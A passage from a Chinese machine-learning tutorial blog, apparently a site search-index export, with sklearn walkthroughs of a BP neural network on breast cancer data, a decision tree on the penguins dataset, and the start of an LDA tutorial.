导入训练集分割方法from sklearn.model_selection import train_test_split # 导入预测指标计算函数和混淆矩阵计算函数from sklearn.metrics import classification_report, confusion_matrix# 导入绘图包import seaborn as snsimport matplotlib Step2: 数据读取 / 载入 12# 导入乳腺癌数据集cancer = load_breast_cancer() Step3: 数据信息简单查看与可视化 12345678910111213# 查看数据集信息print(&#x27;breast_cancer数据集的长度为：&#x27;,len(cancer))print(&#x27;breast_cancer数据集的类型为：&#x27;,type(cancer))# 分割数据为训练集和测试集cancer_data = cancer[&#x27;data&#x27;]print(&#x27;cancer_data数据维度为：&#x27;,cancer_data.shape)cancer_target = cancer[&#x27;target&#x27;]print(&#x27;cancer_target标签维度为：&#x27;,cancer_target.shape)cancer_names = cancer[&#x27;feature_names&#x27;]cancer_desc = cancer[&#x27;DESCR&#x27;]#分为训练集与测试集cancer_data_train,cancer_data_test = train_test_split(cancer_data,test_size=0.2,random_state=42)#训练集cancer_target_train,cancer_target_test = train_test_split(cancer_target,test_size=0.2,random_state=42)#测试集 breast_cancer数据集的长度为： 7 breast_cancer数据集的类型为： &lt;class 'sklearn.utils.Bunch'&gt; cancer_data数据维度为： (569, 30) cancer_target标签维度为： (569,) Step4: 利用 BP 神经网络在乳腺癌数据上进行训练和预测 1234# 建立 BP 模型, 采用Adam优化器，relu非线性映射函数BP = MLPClassifier(solver=&#x27;adam&#x27;,activation = &#x27;relu&#x27;,max_iter = 1000,alpha = 1e-3,hidden_layer_sizes = (64,32, 32),random_state = 1)# 进行模型训练BP.fit(cancer_data_train, cancer_target_train) MLPClassifier(alpha=0.001, hidden_layer_sizes=(64, 32, 32), max_iter=1000, random_state=1) 1234567891011121314# 进行模型预测predict_train_labels = BP.predict(cancer_data_train)# 可视化真实数据fig = plt.figure()ax = Axes3D(fig, rect=[0, 0, 1, 1], elev=20, azim=20) ax.scatter(cancer_data_train[:, 0], cancer_data_train[:, 1], cancer_data_train[:, 2], marker=&#x27;o&#x27;, c=cancer_target_train)plt.title(&#x27;True Label Map&#x27;)plt.show()# 可视化预测数据fig = plt.figure()ax = Axes3D(fig, rect=[0, 0, 1, 1], elev=20, azim=20) ax.scatter(cancer_data_train[:, 0], cancer_data_train[:, 1], cancer_data_train[:, 2], marker=&#x27;o&#x27;, c=predict_train_labels)plt.title(&#x27;Cancer with BP Model&#x27;)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:5: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6. This is consistent with other Axes classes. &quot;&quot;&quot; c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:11: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6. This is consistent with other Axes classes. # This is added back by InteractiveShellApp.init_path() 123456# 显示预测分数print(&quot;预测准确率: &#123;:.4f&#125;&quot;.format(BP.score(cancer_data_test, cancer_target_test)))# 进行测试集数据的类别预测predict_test_labels = BP.predict(cancer_data_test)print(&quot;测试集的真实标签:\\n&quot;, cancer_target_test)print(&quot;测试集的预测标签:\\n&quot;, predict_test_labels) 预测准确率: 0.9474 测试集的真实标签: [1 0 0 1 1 0 0 0 1 1 1 0 1 0 1 0 1 1 1 0 0 1 0 1 1 1 1 1 1 0 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 1 1 1 1 1 0 0 1 1 1 1 1 0 0 1 1 0 0 1 1 1 0 0 1 1 0 0 1 0 1 1 1 0 1 1 0 1 0 0 0 0 0 0 1 1 1 1 1 1 1 1 0 0 1 0 0 1 0 0 1 1 1 0 1 1 0 1 1 0] 测试集的预测标签: [1 0 0 1 1 0 0 0 1 1 1 0 1 0 1 0 1 1 1 0 1 1 0 1 1 1 1 1 1 0 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 1 1 1 1 1 0 0 1 1 1 1 1 0 1 1 1 0 0 1 1 1 0 0 1 1 0 0 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 1 1 1 1 1 1 1 1 0 0 1 0 0 1 0 0 1 1 1 0 1 1 0 1 1 0] 12# 进行预测结果指标统计 统计每一类别的预测准确率、召回率、F1分数print(classification_report(cancer_target_test, predict_test_labels)) precision recall f1-score support 0 1.00 0.86 0.92 43 1 0.92 1.00 0.96 71 accuracy 0.95 114 macro avg 0.96 0.93 0.94 114 weighted avg 0.95 0.95 0.95 114 ​ 1234# 计算混淆矩阵confusion_mat = confusion_matrix(cancer_target_test, predict_test_labels)# 打混淆矩阵print(confusion_mat) [[37 6] [ 0 71]] 123456789101112# 将混淆矩阵以热力图的防线显示sns.set()figure, ax = plt.subplots()# 画热力图sns.heatmap(confusion_mat, cmap=&quot;YlGnBu_r&quot;, annot=True, ax=ax) # 标题 ax.set_title(&#x27;confusion matrix&#x27;)# x轴为预测类别ax.set_xlabel(&#x27;predict&#x27;) # y轴实际类别ax.set_ylabel(&#x27;true&#x27;) plt.show() ​ ​ # 5. 算法重要知识点 BP 神经网络模型要点在于数据的前向传播和误差反向传播，来对参数进行更新，使得损失最小化。 误差反向传播算法简称反向传播算法（即 BP 算法）。使用反向传播算法的多层感知器又称为 BP 神经网络。BP 算法是一个迭代算法，它的基本思想为： 先计算每一层的状态和激活值，直到最后一层（即信号是前向传播的）； 计算每一层的误差，误差的计算过程是从最后一层向前推进的（这就是反向传播算法名字的由来）； 更新参数（目标是误差变小）。迭代前面两个步骤，直到满足停止准则（比如相邻两次迭代的误差的差别很小）。 在这个过程，函数的导数链式法则求导很重要，需要手动推导 BP 神经网络模型的梯度反向传播过程，熟练掌握链式法则进行求导，对参数进行更新。","categories":[{"name":"天池机器学习入门","slug":"天池机器学习入门","permalink":"http://example.com/categories/%E5%A4%A9%E6%B1%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"基于决策树的分类预测","slug":"机器学习/天池/基于决策树的分类预测","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:28:49.456Z","comments":true,"path":"2021/11/08/机器学习/天池/基于决策树的分类预测/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E5%86%B3%E7%AD%96%E6%A0%91%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/","excerpt":"","text":"# 1 逻决策树的介绍和应用 # 1.1 决策树的介绍 决策树是一种常见的分类模型，在金融风控、医疗辅助诊断等诸多行业具有较为广泛的应用。决策树的核心思想是基于树结构对数据进行划分，这种思想是人类处理问题时的本能方法。例如在婚恋市场中，女方通常会先询问男方是否有房产，如果有房产再了解是否有车产，如果有车产再看是否有稳定工作…… 最后得出是否要深入了解的判断。 决策树的主要优点： 具有很好的解释性，模型可以生成可以理解的规则。 可以发现特征的重要程度。 模型的计算复杂度较低。 决策树的主要缺点： 模型容易过拟合，需要采用减枝技术处理。 不能很好利用连续型特征。 预测能力有限，无法达到其他强监督模型效果。 方差较高，数据分布的轻微改变很容易造成树结构完全不同。 # 1.2 决策树的应用 由于决策树模型中自变量与因变量的非线性关系以及决策树简单的计算方法，使得它成为集成学习中最为广泛使用的基模型。梯度提升树 (GBDT)，XGBoost 以及 LightGBM 等先进的集成模型都采用了决策树作为基模型，在广告计算、CTR 预估、金融风控等领域大放异彩，成为当今与神经网络相提并论的复杂模型，更是数据挖掘比赛中的常客。在新的研究中，南京大学周志华教授提出一种多粒度级联森林模型，创造了一种全新的基于决策树的深度集成方法，为我们提供了决策树发展的另一种可能。 同时决策树在一些明确需要可解释性或者提取分类规则的场景中被广泛应用，而其他机器学习模型在这一点很难做到。例如在医疗辅助系统中，为了方便专业人员发现错误，常常将决策树算法用于辅助病症检测。例如在一个预测哮喘患者的模型中，医生发现测试的许多高级模型的效果非常差。在他们运行了一个决策树模型后发现，算法认为剧烈咳嗽的病人患哮喘的风险很小。但医生非常清楚剧烈咳嗽一般都会被立刻检查治疗，这意味着患有剧烈咳嗽的哮喘病人都会马上得到收治。用于建模的数据认为这类病人风险很小，是因为所有这类病人都得到了及时治疗，所以极少有人在此之后患病或死亡。 # 2. 实验室手册 # 2.1 学习目标 了解 决策树 的理论知识 掌握 决策树 的 sklearn 函数调用并将其运用在企鹅数据集的预测中 # 2.2 代码流程 # Part1 Demo 实践 Step1: 库函数导入 Step2: 模型训练 Step3: 数据和模型可视化 Step4: 模型预测 # Part2 基于企鹅（penguins）数据集的决策树分类实践 Step1: 库函数导入 Step2: 数据读取 / 载入 Step3: 数据信息简单查看 Step4: 可视化描述 Step5: 利用 决策树模型 在二分类上 进行训练和预测 Step6: 利用 决策树模型 在三分类 (多分类) 上 进行训练和预测 # 2.3 算法实战 # 2.3.1 Demo 实践 Step1: 库函数导入 12345678910## 基础函数库import numpy as np ## 导入画图库import matplotlib.pyplot as pltimport seaborn as sns## 导入决策树模型函数from sklearn.tree import DecisionTreeClassifierfrom sklearn import tree Step2: 模型训练 1234567891011##Demo演示LogisticRegression分类## 构造数据集x_fearures = np.array([[-1, -2], [-2, -1], [-3, -2], [1, 3], [2, 1], [3, 2]])y_label = np.array([0, 1, 0, 1, 0, 1])## 调用决策树回归模型tree_clf = DecisionTreeClassifier()## 调用决策树模型拟合构造的数据集tree_clf = tree_clf.fit(x_fearures, y_label) Step3: 数据和模型可视化 12345## 可视化构造的数据样本点plt.figure()plt.scatter(x_fearures[:,0],x_fearures[:,1], c=y_label, s=50, cmap=&#x27;viridis&#x27;)plt.title(&#x27;Dataset&#x27;)plt.show() ​ ​ Step4: 模型预测 12345678910## 创建新样本x_fearures_new1 = np.array([[0, -1]])x_fearures_new2 = np.array([[2, 1]])## 在训练集和测试集上分布利用训练好的模型进行预测y_label_new1_predict = tree_clf.predict(x_fearures_new1)y_label_new2_predict = tree_clf.predict(x_fearures_new2)print(&#x27;The New point 1 predict class:\\n&#x27;,y_label_new1_predict)print(&#x27;The New point 2 predict class:\\n&#x27;,y_label_new2_predict) The New point 1 predict class: [1] The New point 2 predict class: [0] # 2.3.2 基于企鹅数据集的决策树实战 在实践的最开始，我们首先需要导入一些基础的函数库包括：numpy （Python 进行科学计算的基础软件包），pandas（pandas 是一种快速，强大，灵活且易于使用的开源数据分析和处理工具），matplotlib 和 seaborn 绘图。 12#下载需要用到的数据集!wget https://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/6tree/penguins_raw.csv Step1: 库函数导入 1234567## 基础函数库import numpy as np import pandas as pd## 绘图函数库import matplotlib.pyplot as pltimport seaborn as sns 本次我们选择企鹅数据（palmerpenguins）进行方法的尝试训练，该数据集一共包含 8 个变量，其中 7 个特征变量，1 个目标分类变量。共有 150 个样本，目标变量为 企鹅的类别 其都属于企鹅类的三个亚属，分别是 (Adélie, Chinstrap and Gentoo)。包含的三种种企鹅的七个特征，分别是所在岛屿，嘴巴长度，嘴巴深度，脚蹼长度，身体体积，性别以及年龄。 变量 描述 species a factor denoting penguin species island a factor denoting island in Palmer Archipelago, Antarctica bill_length_mm a number denoting bill length bill_depth_mm a number denoting bill depth flipper_length_mm an integer denoting flipper length body_mass_g an integer denoting body mass sex a factor denoting penguin sex year an integer denoting the study year Step2: 数据读取 / 载入 123## 我们利用Pandas自带的read_csv函数读取并转化为DataFrame格式data = pd.read_csv(&#x27;./penguins_raw.csv&#x27;) 123## 为了方便我们仅选取四个简单的特征，有兴趣的同学可以研究下其他特征的含义以及使用方法data = data[[&#x27;Species&#x27;,&#x27;Culmen Length (mm)&#x27;,&#x27;Culmen Depth (mm)&#x27;, &#x27;Flipper Length (mm)&#x27;,&#x27;Body Mass (g)&#x27;]] Step3: 数据信息简单查看 12## 利用.info()查看数据的整体信息data.info() &lt;class 'pandas.core.frame.DataFrame'&gt; RangeIndex: 344 entries, 0 to 343 Data columns (total 5 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 Species 344 non-null object 1 Culmen Length (mm) 342 non-null float64 2 Culmen Depth (mm) 342 non-null float64 3 Flipper Length (mm) 342 non-null float64 4 Body Mass (g) 342 non-null float64 dtypes: float64(4), object(1) memory usage: 13.6+ KB 12## 进行简单的数据查看，我们可以利用 .head() 头部.tail()尾部data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; Species Culmen Length (mm) Culmen Depth (mm) Flipper Length (mm) Body Mass (g) 0 Adelie Penguin (Pygoscelis adeliae) 39.1 18.7 181.0 3750.0 1 Adelie Penguin (Pygoscelis adeliae) 39.5 17.4 186.0 3800.0 2 Adelie Penguin (Pygoscelis adeliae) 40.3 18.0 195.0 3250.0 3 Adelie Penguin (Pygoscelis adeliae) NaN NaN NaN NaN 4 Adelie Penguin (Pygoscelis adeliae) 36.7 19.3 193.0 3450.0 这里我们发现数据集中存在 NaN，一般的我们认为 NaN 在数据集中代表了缺失值，可能是数据采集或处理时产生的一种错误。这里我们采用 - 1 将缺失值进行填补，还有其他例如 “中位数填补、平均数填补” 的缺失值处理方法有兴趣的同学也可以尝试。 12data = data.fillna(-1)data.tail() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; Species Culmen Length (mm) Culmen Depth (mm) Flipper Length (mm) Body Mass (g) 339 Chinstrap penguin (Pygoscelis antarctica) 55.8 19.8 207.0 4000.0 340 Chinstrap penguin (Pygoscelis antarctica) 43.5 18.1 202.0 3400.0 341 Chinstrap penguin (Pygoscelis antarctica) 49.6 18.2 193.0 3775.0 342 Chinstrap penguin (Pygoscelis antarctica) 50.8 19.0 210.0 4100.0 343 Chinstrap penguin (Pygoscelis antarctica) 50.2 18.7 198.0 3775.0 123## 其对应的类别标签为&#x27;Adelie Penguin&#x27;, &#x27;Gentoo penguin&#x27;, ## &#x27;Chinstrap penguin&#x27;三种不同企鹅的类别。data[&#x27;Species&#x27;].unique() array(['Adelie Penguin (Pygoscelis adeliae)', 'Gentoo penguin (Pygoscelis papua)', 'Chinstrap penguin (Pygoscelis antarctica)'], dtype=object) 12## 利用value_counts函数查看每个类别数量pd.Series(data[&#x27;Species&#x27;]).value_counts() Adelie Penguin (Pygoscelis adeliae) 152 Gentoo penguin (Pygoscelis papua) 124 Chinstrap penguin (Pygoscelis antarctica) 68 Name: Species, dtype: int64 12## 对于特征进行一些统计描述data.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; Culmen Length (mm) Culmen Depth (mm) Flipper Length (mm) Body Mass (g) count 344.000000 344.000000 344.000000 344.000000 mean 43.660756 17.045640 199.741279 4177.319767 std 6.428957 2.405614 20.806759 861.263227 min -1.000000 -1.000000 -1.000000 -1.000000 25% 39.200000 15.500000 190.000000 3550.000000 50% 44.250000 17.300000 197.000000 4025.000000 75% 48.500000 18.700000 213.000000 4750.000000 max 59.600000 21.500000 231.000000 6300.000000 Step4: 可视化描述 123## 特征与标签组合的散点可视化sns.pairplot(data=data, diag_kind=&#x27;hist&#x27;, hue= &#x27;Species&#x27;)plt.show() ​ ​ 从上图可以发现，在 2D 情况下不同的特征组合对于不同类别的企鹅的散点分布，以及大概的区分能力。Culmen Lenth 与其他特征的组合散点的重合较少，所以对于数据集的划分能力最好。 我们发现 1234567891011121314&#x27;&#x27;&#x27;为了方便我们将标签转化为数字 &#x27;Adelie Penguin (Pygoscelis adeliae)&#x27; ------0 &#x27;Gentoo penguin (Pygoscelis papua)&#x27; ------1 &#x27;Chinstrap penguin (Pygoscelis antarctica) ------2 &#x27;&#x27;&#x27;def trans(x): if x == data[&#x27;Species&#x27;].unique()[0]: return 0 if x == data[&#x27;Species&#x27;].unique()[1]: return 1 if x == data[&#x27;Species&#x27;].unique()[2]: return 2data[&#x27;Species&#x27;] = data[&#x27;Species&#x27;].apply(trans) 12345for col in data.columns: if col != &#x27;Species&#x27;: sns.boxplot(x=&#x27;Species&#x27;, y=col, saturation=0.5, palette=&#x27;pastel&#x27;, data=data) plt.title(col) plt.show() ​ ​ 利用箱型图我们也可以得到不同类别在不同特征上的分布差异情况。 12345678910111213141516# 选取其前三个特征绘制三维散点图from mpl_toolkits.mplot3d import Axes3Dfig = plt.figure(figsize=(10,8))ax = fig.add_subplot(111, projection=&#x27;3d&#x27;)data_class0 = data[data[&#x27;Species&#x27;]==0].valuesdata_class1 = data[data[&#x27;Species&#x27;]==1].valuesdata_class2 = data[data[&#x27;Species&#x27;]==2].values# &#x27;setosa&#x27;(0), &#x27;versicolor&#x27;(1), &#x27;virginica&#x27;(2)ax.scatter(data_class0[:,0], data_class0[:,1], data_class0[:,2],label=data[&#x27;Species&#x27;].unique()[0])ax.scatter(data_class1[:,0], data_class1[:,1], data_class1[:,2],label=data[&#x27;Species&#x27;].unique()[1])ax.scatter(data_class2[:,0], data_class2[:,1], data_class2[:,2],label=data[&#x27;Species&#x27;].unique()[2])plt.legend()plt.show() ​ ​ Step5: 利用 决策树模型 在二分类上 进行训练和预测 12345678910111213## 为了正确评估模型性能，将数据划分为训练集和测试集，并在训练集上训练模型，## 在测试集上验证模型性能。from sklearn.model_selection import train_test_split## 选择其类别为0和1的样本 （不包括类别为2的样本）data_target_part = data[data[&#x27;Species&#x27;].isin([0,1])][[&#x27;Species&#x27;]]data_features_part = data[data[&#x27;Species&#x27;].isin([0,1])][[&#x27;Culmen Length (mm)&#x27;, &#x27;Culmen Depth (mm)&#x27;, &#x27;Flipper Length (mm)&#x27;,&#x27;Body Mass (g)&#x27;]]## 测试集大小为20%， 80%/20%分x_train, x_test, y_train, y_test = train_test_split(data_features_part, data_target_part, test_size = 0.2, random_state = 2020) 1234567## 从sklearn中导入决策树模型from sklearn.tree import DecisionTreeClassifierfrom sklearn import tree## 定义 决策树模型 clf = DecisionTreeClassifier(criterion=&#x27;entropy&#x27;)# 在训练集上训练决策树模型clf.fit(x_train, y_train) DecisionTreeClassifier(criterion='entropy') 12345678910111213141516171819## 在训练集和测试集上分布利用训练好的模型进行预测train_predict = clf.predict(x_train)test_predict = clf.predict(x_test)from sklearn import metrics## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_train,train_predict))print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_test,test_predict))## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)print(&#x27;The confusion matrix result:\\n&#x27;,confusion_matrix_result)# 利用热力图对于结果进行可视化plt.figure(figsize=(8, 6))sns.heatmap(confusion_matrix_result, annot=True, cmap=&#x27;Blues&#x27;)plt.xlabel(&#x27;Predicted labels&#x27;)plt.ylabel(&#x27;True labels&#x27;)plt.show() The accuracy of the Logistic Regression is: 0.9954545454545455 The accuracy of the Logistic Regression is: 1.0 The confusion matrix result: [[31 0] [ 0 25]] 我们可以发现其准确度为 1，代表所有的样本都预测正确了。 Step6: 利用 决策树模型 在三分类 (多分类) 上 进行训练和预测 1234567## 测试集大小为20%， 80%/20%分x_train, x_test, y_train, y_test = train_test_split(data[[&#x27;Culmen Length (mm)&#x27;,&#x27;Culmen Depth (mm)&#x27;, &#x27;Flipper Length (mm)&#x27;,&#x27;Body Mass (g)&#x27;]], data[[&#x27;Species&#x27;]], test_size = 0.2, random_state = 2020)## 定义 决策树模型 clf = DecisionTreeClassifier()# 在训练集上训练决策树模型clf.fit(x_train, y_train) DecisionTreeClassifier() 1234567891011121314## 在训练集和测试集上分布利用训练好的模型进行预测train_predict = clf.predict(x_train)test_predict = clf.predict(x_test)## 由于决策树模型是概率预测模型（前文介绍的 p = p(y=1|x,\\theta)）,所有我们可以利用 predict_proba 函数预测其概率train_predict_proba = clf.predict_proba(x_train)test_predict_proba = clf.predict_proba(x_test)print(&#x27;The test predict Probability of each class:\\n&#x27;,test_predict_proba)## 其中第一列代表预测为0类的概率，第二列代表预测为1类的概率，第三列代表预测为2类的概率。## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_train,train_predict))print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_test,test_predict)) The test predict Probability of each class: [[0. 0. 1.] [0. 1. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 0. 1.] [0. 0. 1.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 0. 1.] [1. 0. 0.] [0. 0. 1.] [1. 0. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 0. 1.] [0. 0. 1.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 0. 1.] [0. 0. 1.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [0. 0. 1.] [0. 0. 1.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [0. 0. 1.] [0. 0. 1.] [1. 0. 0.] [0. 1. 0.] [0. 0. 1.] [1. 0. 0.] [1. 0. 0.]] The accuracy of the Logistic Regression is: 0.9963636363636363 The accuracy of the Logistic Regression is: 0.9710144927536232 12345678910## 查看混淆矩阵confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)print(&#x27;The confusion matrix result:\\n&#x27;,confusion_matrix_result)# 利用热力图对于结果进行可视化plt.figure(figsize=(8, 6))sns.heatmap(confusion_matrix_result, annot=True, cmap=&#x27;Blues&#x27;)plt.xlabel(&#x27;Predicted labels&#x27;)plt.ylabel(&#x27;True labels&#x27;)plt.show() The confusion matrix result: [[31 1 0] [ 0 23 0] [ 1 0 13]] # 2.4 重要知识点 # 2.4.3 重要参数 # 2.4.3.1 criterion Criterion 这个参数正是用来决定模型特征选择的计算方法的。sklearn 提供了两种选择： 输入”entropy“，使用信息熵（Entropy） 输入”gini“，使用基尼系数（Gini Impurity） # 2.4.3.2 random_state &amp; splitter random_state 用来设置分枝中的随机模式的参数，默认 None，在高维度时随机性会表现更明显。splitter 也是用来控制决策树中的随机选项的，有两种输入值，输入”best&quot;，决策树在分枝时虽然随机，但是还是会优先选择更重要的特征进行分枝（重要性可以通过属性 feature_importances_查看），输入 “random&quot;，决策树在分枝时会更加随机，树会因为含有更多的不必要信息而更深更大，并因这些不必要信息而降低对训练集的拟合。 # 2.4.3.3 max_depth 限制树的最大深度，超过设定深度的树枝全部剪掉。这是用得最广泛的剪枝参数，在高维度低样本量时非常有效。决策树多生长一层，对样本量的需求会增加一倍，所以限制树深度能够有效地限制过拟合。 # 2.4.3.4 min_samples_leaf min_samples_leaf 限定，一个节点在分枝后的每个子节点都必须包含至少 min_samples_leaf 个训练样本，否则分枝就不会发生，或者，分枝会朝着满足每个子节点都包含 min_samples_leaf 个样本的方向去发生。一般搭配 max_depth 使用，在回归树中有神奇的效果，可以让模型变得更加平滑。这个参数的数量设置得太小会引起过拟合，设置得太大就会阻止模型学习数据。","categories":[{"name":"天池机器学习入门","slug":"天池机器学习入门","permalink":"http://example.com/categories/%E5%A4%A9%E6%B1%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"基于线性判别模型的分类","slug":"机器学习/天池/基于线性判别模型的分类","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:29:33.220Z","comments":true,"path":"2021/11/08/机器学习/天池/基于线性判别模型的分类/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E7%BA%BF%E6%80%A7%E5%88%A4%E5%88%AB%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%88%86%E7%B1%BB/","excerpt":"","text":"# 1. 前言：LDA 算法简介和应用 # 1.1. 算法简介 线性判别模型（LDA）在模式识别领域（比如人脸识别等图形图像识别领域）中有非常广泛的应用。LDA 是一种监督学习的降维技术，也就是说它的数据集的每个样本是有类别输出的。这点和 PCA 不同。PCA 是不考虑样本类别输出的无监督降维技术。LDA 的思想可以用一句话概括，就是 “投影后类内方差最小，类间方差最大”。我们要将数据在低维度上进行投影，投影后希望每一种类别数据的投影点尽可能的接近，而不同类别的数据的类别中心之间的距离尽可能的大。即：将数据投影到维度更低的空间中，使得投影后的点，会形成按类别区分，一簇一簇的情况，相同类别的点，将会在投影后的空间中更接近方法。 LDA 算法的主要优点： 1. 在降维过程中可以使用类别的先验知识经验，而像 PCA 这样的无监督学习则无法使用类别先验知识； 2.LDA 在样本分类信息依赖均值而不是方差的时候，比 PCA 之类的算法较优。 LDA 算法的主要缺点： 1.LDA 不适合对非高斯分布样本进行降维，PCA 也有这个问题 2.LDA 降维最多降到类别数 k-1 的维数，如果我们降维的维度大于 k-1，则不能使用 LDA。当然目前有一些 LDA 的进化版算法可以绕过这个问题 3.LDA 在样本分类信息依赖方差而不是均值的时候，降维效果不好 4.LDA 可能过度拟合数据， # 1.2. 算法应用 LDA 在模式识别领域（比如人脸识别，舰艇识别等图形图像识别领域）中有非常广泛的应用，因此我们有必要了解一下它的算法原理。不过在学习 LDA 之前，我们有必要将其与自然语言处理领域中的 LDA 区分开，在自然语言处理领域，LDA 是隐含狄利克雷分布（Latent DIrichlet Allocation，简称 LDA），它是一种处理文档的主题模型，我们本文讨论的是线性判别分析，因此后面所说的 LDA 均为线性判别分析。 LDA 除了可以用于降维以外，还可以用于分类。一个常见的 LDA 分类基本思想是假设各个类别的样本数据符合高斯分布，这样利用 LDA 进行投影后，可以利用极大似然估计计算各个类别投影数据的均值和方差，进而得到该类别高斯分布的概率密度函数。当一个新的样本到来后，我们可以将它投影，然后将投影后的样本特征分别带入各个类别的高斯分布概率密度函数，计算它属于这个类别的概率，最大的概率对应的类别即为预测类别。 # 2. 学习目标 掌握 LDA 算法基本原理 掌握利用 LDA 进行代码实战 # 3. 代码流程 # Part 1 Demo 实践 Step1: 库函数导入 Step2: 模型训练 Step3: 模型参数查看 Step4: 数据和模型可视化 Step5: 模型预测 # Part 2 基于 LDA 手写数字分类实践 Step1: 库函数导入 Step2: 数据读取 / 载入 Step3: 数据信息简单查看与可视化 Step4: 利用 LDA 在手写数字上进行训练和预测 # 4. 代码实战 # 4.1 Demo 实践 # Step1: 库函数导入 12345678910# 基础数组运算库导入import numpy as np # 画图库导入import matplotlib.pyplot as plt # 导入三维显示工具from mpl_toolkits.mplot3d import Axes3D# 导入LDA模型from sklearn.discriminant_analysis import LinearDiscriminantAnalysis# 导入demo数据制作方法from sklearn.datasets import make_classification # Step2: 模型训练 123456789# 制作四个类别的数据，每个类别100个样本X, y = make_classification(n_samples=1000, n_features=3, n_redundant=0, n_classes=4, n_informative=2, n_clusters_per_class=1, class_sep=3, random_state=10)# 将四个类别的数据进行三维显示fig = plt.figure()ax = Axes3D(fig, rect=[0, 0, 1, 1], elev=20, azim=20)ax.scatter(X[:, 0], X[:, 1], X[:, 2], marker=&#x27;o&#x27;, c=y)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:7: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6. This is consistent with other Axes classes. import sys 1234# 建立 LDA 模型lda = LinearDiscriminantAnalysis()# 进行模型训练lda.fit(X, y) LinearDiscriminantAnalysis() # Step3: 模型参数查看 12# 查看 LDA 模型的参数lda.get_params() &#123;'covariance_estimator': None, 'n_components': None, 'priors': None, 'shrinkage': None, 'solver': 'svd', 'store_covariance': False, 'tol': 0.0001&#125; # Step4: 数据和模型可视化 12345# 进行模型预测X_new = lda.transform(X)# 可视化预测数据plt.scatter(X_new[:, 0], X_new[:, 1], marker=&#x27;o&#x27;, c=y)plt.show() ​ ​ # Step5: 模型预测 12345678910111213141516# 进行新的测试数据测试a = np.array([[-1, 0.1, 0.1]])print(f&quot;&#123;a&#125; 类别是: &quot;, lda.predict(a))print(f&quot;&#123;a&#125; 类别概率分别是: &quot;, lda.predict_proba(a))a = np.array([[-12, -100, -91]])print(f&quot;&#123;a&#125; 类别是: &quot;, 